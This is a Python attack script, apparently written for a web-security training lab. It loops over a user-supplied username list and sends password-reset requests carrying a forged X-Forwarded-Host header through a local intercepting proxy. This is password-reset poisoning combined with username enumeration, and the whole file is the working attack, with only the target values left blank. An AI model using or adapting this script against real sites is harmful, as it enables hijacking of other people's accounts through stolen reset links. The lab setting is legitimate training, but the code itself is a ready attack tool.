import requests
import re

lab_value=" "
sessionValue=" "
host=" " 
XForwardedHost=" " 
csrftoken=" " 
usernamelist=""


def reset_pass(login):
    #cookie={'session':sessionValue}
    cookie={'_lab':lab_value,'session':sessionValue}
    #payload = {'username':login,'password':'peter'}
    payload = {'csrf':csrftoken,'username':login}
    hed={'X-Forwarded-Host':XForwardedHost}
    proxyDict={"https":"https://127.0.0.1:8080"}
    try:
        #response = requests.post(host ,data=payload)
        response = requests.post(host ,data=payload, cookies=cookie,headers=hed,proxies=proxyDict)
    except Exception as e:
        print(e)
    res_status = response.status_code
    #or check 
    #res_status = response.history
    return res_status

def open_list_file(filepath):
    file=open(filepath,'r')
    lists=file.readlines()
    words=[]
    for i in range(len(lists)):
        words.append(lists[i].rstrip('\n').split(',')[0])        
    return words

try:
    filepath=input("Enter a filepath to username list: ")
    usernamelist=open_list_file(filepath)
except Exception as e:
        print(e)

def bruteforce():
    for word in usernamelist:
        status=reset_pass(word)
        print(status)


bruteforce()
